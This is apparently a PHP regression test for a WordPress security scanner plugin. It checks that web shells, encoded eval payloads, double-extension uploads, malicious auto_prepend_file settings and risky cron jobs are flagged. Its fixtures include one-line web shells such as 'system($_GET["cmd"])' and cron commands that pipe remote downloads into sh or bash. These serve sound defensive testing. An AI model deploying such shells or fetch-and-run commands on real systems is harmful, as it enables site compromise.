<?php
/** Standalone regression harness. Fixtures are inspected as bytes, never executed. */
$root = sys_get_temp_dir() . '/errorvault-security-test-' . bin2hex(random_bytes(6)) . '/';
mkdir($root, 0700, true);
define('ABSPATH', $root);
define('WP_CONTENT_DIR', $root . 'wp-content');
define('WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins');
define('DAY_IN_SECONDS', 86400);
define('WPINC', 'wp-includes');
mkdir(WP_PLUGIN_DIR, 0700, true); mkdir(WP_CONTENT_DIR . '/uploads', 0700, true);
$GLOBALS['ev_upload_base'] = WP_CONTENT_DIR . '/uploads';
$GLOBALS['ev_remote_checksum'] = null;
$GLOBALS['ev_cron'] = array();
function wp_normalize_path($v) { return str_replace('\\', '/', $v); }
function wp_upload_dir($a = null, $b = false) { return array('basedir' => $GLOBALS['ev_upload_base']); }
function get_transient($key) { return false; }
function set_transient($key, $value, $ttl) { return true; }
function wp_remote_get($url, $options) { return array('status' => null === $GLOBALS['ev_remote_checksum'] ? 503 : 200, 'body' => $GLOBALS['ev_remote_checksum']); }
function wp_remote_retrieve_response_code($r) { return $r['status']; }
function wp_remote_retrieve_body($r) { return $r['body']; }
function is_wp_error($r) { return false; }
function apply_filters($name, $value) { return $value; }
function wp_json_encode($v) { return json_encode($v); }
function wp_list_pluck($rows, $key) { return array_column($rows, $key); }
function number_format_i18n($v) { return number_format($v); }
function _get_cron_array() { return $GLOBALS['ev_cron']; }
function get_option($name, $default = false) { return $default; }
function get_role($name) { return null; }
require __DIR__ . '/../includes/class-errorvault-security-scanner.php';
$checks = 0;
function check($condition, $message) { global $checks; $checks++; if (!$condition) { throw new RuntimeException($message); } }
function invoke($object, $method, ...$args) { $ref = new ReflectionMethod($object, $method); if (PHP_VERSION_ID < 80100) { $ref->setAccessible(true); } return $ref->invoke($object, ...$args); }
function prop($object, $name, ...$value) { $ref = new ReflectionProperty($object, $name); if (PHP_VERSION_ID < 80100) { $ref->setAccessible(true); } if ($value) { $ref->setValue($object, $value[0]); } else { return $ref->getValue($object); } }
function scanner() { $s = new ErrorVault_Security_Scanner(); prop($s, 'deadline', microtime(true) + 30); return $s; }
function put($relative, $content) { $path = ABSPATH . $relative; if (!is_dir(dirname($path))) { mkdir(dirname($path), 0700, true); } file_put_contents($path, $content); clearstatcache(); return $path; }
function has_key($findings, $prefix) { foreach ($findings as $f) { if (0 === strpos($f['key'], $prefix)) { return true; } } return false; }
function cleanup($dir) { foreach (new FilesystemIterator($dir) as $file) { if ($file->isDir() && !$file->isLink()) { cleanup($file->getPathname()); } else { unlink($file->getPathname()); } } rmdir($dir); }
try {
    foreach (array('<?php // Silence is golden.', '<?php /* comment */', '<?php /* guard */ ?>', '<?php exit;', '<?php die();', '<?php __halt_compiler();' . "\n" . '{"rule":"eval(base64_decode(payload))"}') as $source) {
        check(ErrorVault_Security_Evidence::inert_php($source), 'Expected inert guard/data');
        check(null === ErrorVault_Security_Scanner::match_signatures($source, strlen($source)), 'Inert data must not produce a signature');
    }
    foreach (array('<?php phpinfo();', '<?php system("id");', '<?php echo "hello";', '<?php include "payload.png";', '<?php echo 1; __halt_compiler(); data', '<?php ?>not empty', '<?php ?><?=system("id")?>') as $source) {
        check(!ErrorVault_Security_Evidence::inert_php($source), 'Executable index must not be exempt');
    }
    foreach (array('<?php eval(base64_decode("payload"));', '<?php system($_POST["cmd"]);', '<?php eval /* inserted comment */ (base64_decode("x"));', '<?php $_GET["f"]($_POST["x"]);') as $source) {
        $hit = ErrorVault_Security_Scanner::match_signatures($source, strlen($source));
        check($hit && 'critical' === $hit[0], 'Executable signature must remain detected');
    }
    foreach (array('<?php // eval(base64_decode("x"));', '<?php $example = \'system($_POST["cmd"]);\';', '<?php $signatures = array("WSOsetcookie", "c99shell");') as $source) {
        check(null === ErrorVault_Security_Scanner::match_signatures($source, strlen($source)), 'Comments/literal security definitions are not execution');
    }
    // Exact upstream AIOS bootstrap shapes, including __DIR__ and current globals.
    $fwrel = '/wp-content/plugins/all-in-one-wp-security-and-firewall/classes/firewall/wp-security-firewall.php';
    $loader = "if (file_exists(__DIR__.'$fwrel')) { include_once(__DIR__.'$fwrel'); }";
    $globals = "\$GLOBALS['aiowps_firewall_rules_path'] = __DIR__.'/wp-content/uploads/aios/firewall-rules/';\n\$GLOBALS['aiowps_firewall_data'] = array('ABSPATH' => '" . ABSPATH . "',);";
    $bootstrap = '<?php /* @version 1.0.2 */ ' . $globals . $loader;
    check(ErrorVault_Security_Evidence::aios_bootstrap($bootstrap, ABSPATH, WP_PLUGIN_DIR, WP_CONTENT_DIR . '/uploads'), 'Valid current AIOS bootstrap');
    check(ErrorVault_Security_Evidence::aios_bootstrap('<?php ' . $loader, ABSPATH, WP_PLUGIN_DIR, WP_CONTENT_DIR . '/uploads'), 'Valid legacy minimal loader');
    foreach (array($bootstrap . 'system("id");', str_replace('wp-security-firewall.php', 'payload.php', $bootstrap), '<?php include "aios-bootstrap.php";', '<?php include "wordfence-waf.php.evil";') as $fake) {
        check(!ErrorVault_Security_Evidence::aios_bootstrap($fake, ABSPATH, WP_PLUGIN_DIR, WP_CONTENT_DIR . '/uploads'), 'Impostor bootstrap must not be recognized');
    }
    $target = put(ltrim($fwrel, '/'), '<?php // official target fixture');
    $bp = put('aios-bootstrap.php', $bootstrap);
    $s = scanner(); prop($s, 'plugin_checksums', array('all-in-one-wp-security-and-firewall' => array('classes/firewall/wp-security-firewall.php' => array(md5_file($target)))));
    check(invoke($s, 'recognized_root_file', $bp, 'aios-bootstrap.php', filesize($bp)), 'Checksummed AIOS target accepted');
    put('.user.ini', 'auto_prepend_file="' . $bp . '"'); invoke($s, 'check_config');
    $prepend = array_values(array_filter(prop($s, 'findings'), function ($f) { return 0 === strpos($f['key'], 'config:prepend:'); }));
    check(1 === count($prepend) && 'info' === $prepend[0]['status'], 'Verified AIOS prepend is informational');
    $s = scanner(); check(!invoke($s, 'recognized_root_file', $bp, 'aios-bootstrap.php', filesize($bp)), 'Missing target checksums do not establish trust');
    prop($s, 'plugin_checksums', array('all-in-one-wp-security-and-firewall' => array('classes/firewall/wp-security-firewall.php' => array(str_repeat('0',32)))));
    check(!invoke($s, 'recognized_root_file', $bp, 'aios-bootstrap.php', filesize($bp)), 'Modified target is not trusted');
    $tool = put('wp-cli.phar', 'PHAR checksum fixture — not executable');
    $GLOBALS['ev_remote_checksum'] = hash_file('sha512', $tool);
    check(invoke(scanner(), 'recognized_root_file', $tool, 'wp-cli.phar', filesize($tool)), 'Official full-file checksum accepted');
    put('wp-cli.phar', '<?php system($_GET["cmd"]);');
    check(!invoke(scanner(), 'recognized_root_file', $tool, 'wp-cli.phar', filesize($tool)), 'Same filename with altered bytes rejected');
    $GLOBALS['ev_remote_checksum'] = null;
    check(!invoke(scanner(), 'recognized_root_file', $tool, 'wp-cli.phar', filesize($tool)), 'Checksum outage is not trust');
    $s = scanner(); invoke($s, 'check_root_files');
    check(count(prop($s, 'signature_hits')['critical']) > 0, 'Root signatures run even with core checksums unavailable');
    put('wordfence-waf.php', '<?php system($_GET["cmd"]);');
    $s = scanner(); invoke($s, 'check_root_files');
    check(in_array('wordfence-waf.php', array_column(prop($s, 'signature_hits')['critical'], 'path'), true), 'Firewall filename does not bypass signatures');
    $large = put('large.php', '<?php ' . str_repeat(' ', ErrorVault_Security_Scanner::MAX_READ_BYTES));
    $s = scanner(); invoke($s, 'inspect_file', $large, 'large.php', filesize($large)); invoke($s, 'build_file_findings');
    check(prop($s, 'truncated') && has_key(prop($s, 'findings'), 'files:truncated'), 'Oversized files report incomplete coverage');
    check(!has_key(prop($s, 'findings'), 'files:clean'), 'Partial scan cannot report clean pass');
    check(0 === prop($s, 'files_scanned'), 'Skipped file is not counted as inspected');
    put('wp-content/uploads/index.php', '<?php phpinfo();');
    put('wp-content/uploads/guard.php', '<?php // silence');
    put('wp-content/uploads/settings.php', '<?php __halt_compiler(); {"rule":"eval(base64_decode(x))"}');
    put('wp-content/uploads/innocent.php.jpg', '<?php system($_POST["cmd"]);');
    $s = scanner(); invoke($s, 'walk_content');
    check(in_array('wp-content/uploads/index.php', prop($s, 'php_in_uploads'), true), 'No-dollar executable index flagged');
    check(!in_array('wp-content/uploads/settings.php', prop($s, 'php_in_uploads'), true), 'Compiler-halted settings are data');
    check(!in_array('wp-content/uploads/guard.php', prop($s, 'php_in_uploads'), true), 'Comment-only PHP guard is inert');
    check(in_array('wp-content/uploads/innocent.php.jpg', array_column(prop($s, 'signature_hits')['critical'], 'path'), true), 'Double extension PHP inspected');
    foreach (array(array('backup', 'base64_decode'), array('description'=>'assert the backup completed'), array('report'=>'https://example.com/wp-cron.php')) as $args) { check(null === ErrorVault_Security_Evidence::cron_argument_reason($args), 'Ordinary cron data does not imply malware'); }
    foreach (array('curl https://example.invalid/a | sh', '/usr/bin/wget -qO- https://example.invalid/a | /bin/bash', 'base64 -d /tmp/data | php', '/usr/bin/php /srv/wp-content/uploads/task.php') as $command) { check(null !== ErrorVault_Security_Evidence::cron_command_reason($command), 'Risky cron command identified'); }
    check(null === ErrorVault_Security_Evidence::cron_command_reason('*/5 * * * * www-data /usr/bin/php /srv/site/wp-cron.php'), 'Normal wp-cron launcher accepted');
    check(null !== ErrorVault_Security_Evidence::cron_argument_reason(array('code'=>'<?php echo 1;')), 'Embedded PHP requests review');
    $GLOBALS['ev_cron'] = array(time()+60=>array('legitimate_job'=>array('a'=>array('args'=>array('base64_decode'))), 'review_job'=>array('b'=>array('args'=>array('<?php echo 1;')))));
    $GLOBALS['wp_filter'] = array('review_job'=>(object)array('callbacks'=>array(10=>array(array('function'=>'system')))));
    $s = scanner(); invoke($s, 'check_scheduled_tasks', array());
    check(!has_key(prop($s, 'findings'), 'cron:args:'.md5('legitimate_job')), 'Benign cron event is not flagged');
    check(has_key(prop($s, 'findings'), 'cron:callback:'), 'Dangerous callback inspected without invoking it');
    foreach (prop($s, 'findings') as $finding) { check('critical' !== $finding['status'], 'Cron heuristic is a review finding, not confirmed compromise'); }
    $path = put('cron-fixture', "# curl https://example.invalid | sh\n*/5 * * * * root curl https://example.invalid | sh\n");
    $s = scanner(); invoke($s, 'check_scheduled_tasks', array($path));
    $cron = array_values(array_filter(prop($s, 'findings'), function($f) { return 0 === strpos($f['key'], 'cron:system:'); }));
    check(1 === count($cron) && 2 === $cron[0]['details']['line'], 'System cron comments ignored and source line retained');
    check(false === strpos(json_encode($cron), 'https://example.invalid'), 'Raw cron commands do not leak');
    // Trust applies to content, not just a stable filename.
    $s = scanner(); prop($s,'findings',array(array('check'=>'Review file'))); invoke($s,'mark_trustable_last',array('wordfence-waf.php')); $before=prop($s,'findings')[0]['trust']['value'];
    put('wordfence-waf.php','<?php echo "changed";'); prop($s,'findings',array(array('check'=>'Review file')));invoke($s,'mark_trustable_last',array('wordfence-waf.php'));check($before!==prop($s,'findings')[0]['trust']['value'],'Changed content invalidates previous trust');
    // Source-level scanner regression: its own signature definitions aren't malware.
    foreach (array('class-errorvault-security-scanner.php', 'class-errorvault-security-evidence.php') as $name) {
        $source = file_get_contents(__DIR__ . '/../includes/' . $name);
        check(null === ErrorVault_Security_Scanner::match_signatures($source, strlen($source)), 'Scanner must inspect its own code without a filename exemption');
    }
    check(null === ErrorVault_Security_Scanner::match_signatures('<?php /* include "payload.png"; */', 40), 'Commented include is not an include');
    check(null !== ErrorVault_Security_Scanner::match_signatures('<?php include __DIR__."/payload.png";', 40), 'Actual non-PHP include remains suspicious');
    put('.user.ini', '; auto_prepend_file="/tmp/evil.php"');
    $s = scanner(); invoke($s, 'check_config'); check(!has_key(prop($s,'findings'),'config:prepend:'), 'Commented configuration directive ignored');
    put('.user.ini', 'auto_prepend_file="/tmp/not-wordfence-waf.php-malware"');
    $s = scanner(); invoke($s, 'check_config');
    $f = array_values(array_filter(prop($s,'findings'), function($f){return 0===strpos($f['key'],'config:prepend:');}));
    check(1===count($f) && 'warning'===$f[0]['status'], 'Firewall substring cannot suppress a persistence warning');
    $custom=put('custom-uploads/shell.phtml','<?php system($_REQUEST["cmd"]);');
    $GLOBALS['ev_upload_base']=dirname($custom); $s=scanner();invoke($s,'walk_content',dirname($custom));
    check(in_array('custom-uploads/shell.phtml',prop($s,'php_in_uploads'),true),'Custom uploads path is inspected');
    $GLOBALS['ev_upload_base']=WP_CONTENT_DIR.'/uploads';
    $s=scanner();
    for($i=0;$i<550;$i++){invoke($s,'add_finding','cron:'.$i,'database','Review cron','warning',true,'Review needed');}
    invoke($s,'add_finding','critical:test','files','Known malware','critical',true,'Known fixture');invoke($s,'limit_findings');
    check(500===count(prop($s,'findings')),'Findings respect the existing API limit');
    check(has_key(prop($s,'findings'),'critical:test') && has_key(prop($s,'findings'),'files:truncated'),'Critical evidence and truncation survive capping');
    $s=scanner();invoke($s,'add_finding','duplicate','files','Review','info',false,'First');invoke($s,'add_finding','duplicate','files','Review','warning',true,'Second');
    check(1===count(prop($s,'findings')) && 'warning'===prop($s,'findings')[0]['status'],'Repeated signals keep strongest evidence once');
    echo "PASS: $checks security regression checks\n";
} finally { cleanup($root); }
